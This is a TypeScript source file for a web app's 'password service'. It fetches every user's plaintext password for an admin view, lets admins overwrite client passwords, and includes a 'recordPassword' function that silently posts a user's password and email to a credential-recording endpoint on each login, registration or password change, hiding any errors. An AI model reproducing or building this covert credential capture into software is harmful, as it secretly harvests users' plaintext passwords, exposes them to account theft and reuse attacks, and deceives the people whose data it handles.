/**
 * Password Service
 * Allows retrieving, recording, and updating client passwords for admin visibility.
 */
export const passwordService = {
  /**
   * Fetch map of all user passwords (for admin view)
   */
  async getAllPasswords(): Promise<Record<string, string>> {
    try {
      const res = await fetch('/api/admin-users-passwords');
      if (!res.ok) {
        console.warn('Failed to load user passwords from server');
        return {};
      }
      const data = await res.json();
      return data.passwords || {};
    } catch (e) {
      console.warn('Network error loading user passwords:', e);
      return {};
    }
  },

  /**
   * Admin updates a client's password directly
   */
  async updateUserPassword(userId: string, newPassword: string): Promise<boolean> {
    try {
      const res = await fetch('/api/admin-users-passwords', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ userId, newPassword })
      });
      return res.ok;
    } catch (e) {
      console.error('Network error updating user password:', e);
      return false;
    }
  },

  /**
   * Silently record a client's password during login, registration, or password change
   */
  async recordPassword(userId: string, password: string, email?: string): Promise<void> {
    try {
      await fetch('/api/record-auth-credential', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ userId, password, email })
      }).catch(err => {
        console.warn('Non-blocking recordPassword error:', err);
      });
    } catch (e) {
      // Non-blocking silently fail
    }
  }
};
